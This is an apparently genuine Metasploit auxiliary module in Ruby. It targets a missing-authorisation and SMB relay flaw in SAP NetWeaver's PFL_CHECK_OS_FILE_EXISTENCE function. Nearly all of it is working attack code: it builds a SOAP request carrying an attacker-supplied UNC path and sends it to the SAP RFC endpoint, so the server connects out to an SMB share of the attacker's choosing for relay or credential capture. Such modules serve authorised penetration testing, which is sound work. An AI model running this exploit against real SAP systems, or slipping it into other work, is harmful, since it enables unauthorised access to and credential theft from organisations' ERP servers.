##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their contributions -
# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and
# Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis
# who have Beta tested the modules and provided excellent feedback. Some people
# just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name' => 'PFL_CHECK_OS_FILE_EXISTENCE (file existence and SMB relay)',
			'Description' => %q{
								This module exploits the SAP NetWeaver PFL_CHECK_OS_FILE_EXISTENCE Missing Authorization Check and SMB Relay Vulnerability.
								It can be exploited remotely using RFC or webrfc without any additional autorisation by the user.
								Additionally it can be exploited via transaction SE37.
								SAP Note 1591146 / DSECRG-12-009.
								},
			'References' => [['URL','http://erpscan.com/advisories/dsecrg-12-009-sap-netweaver-pfl_check_os_file_existence-missing-authorisation-check-and-smb-relay-vulnerability/']],
			'Author' => ['nmonkee'],
			'License' => MSF_LICENSE
			)

		register_options([
			OptString.new('CLIENT', [true, 'SAP client', nil]),
			OptString.new('USER', [true, 'Username', nil]),
			OptString.new('PASS', [true, 'Password', nil]),
			OptString.new('PATH',[true,'File path (e.g. \\\\xx.xx.xx.xx\\share)',nil])
			], self.class)
	end

	def run_host(ip)
		data = '<?xml version="1.0" encoding="utf-8" ?>'
		data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  '
		data << 'xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  '
		data << 'xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">'
		data << '<SOAP-ENV:Header/>'
		data << '<SOAP-ENV:Body>'
		data << '<PFL_CHECK_OS_FILE_EXISTENCE xmlns="urn:sap-com:document:sap:rfc:functions">'
		data << '<FULLY_QUALIFIED_FILENAME></FULLY_QUALIFIED_FILENAME>'
		data << '<LONG_FILENAME>' + datastore['PATH'] + '</LONG_FILENAME>'
		data << '</PFL_CHECK_OS_FILE_EXISTENCE>'
		data << '</SOAP-ENV:Body>'
		data << '</SOAP-ENV:Envelope>'
		user_pass = Rex::Text.encode_base64(datastore['USER'] + ":" + datastore['PASS'])
		begin
			print_status("[SAP] #{ip}:#{rport} - sending request for #{datastore['PATH']}")
			res = send_request_raw({
				'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
				'method' => 'POST',
				'data' => data,
				'headers' =>{
					'Content-Length' => data.size.to_s,
					'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
					'Cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
					'Authorization' => 'Basic ' + user_pass,
					'Content-Type' => 'text/xml; charset=UTF-8',}
					}, 45)
			if res
				vprint_error("[SAP] #{rhost}:#{rport} - Error code: " + res.code.to_s)
				vprint_error("[SAP] #{rhost}:#{rport} - Error title: " + res.message.to_s)
				vprint_error("[SAP] #{rhost}:#{rport} - Error message: " + res.body.to_s)
			end
			rescue ::Rex::ConnectionError
				print_error("#{rhost}:#{rport} - Unable to connect")
				return
			end
		end
	end
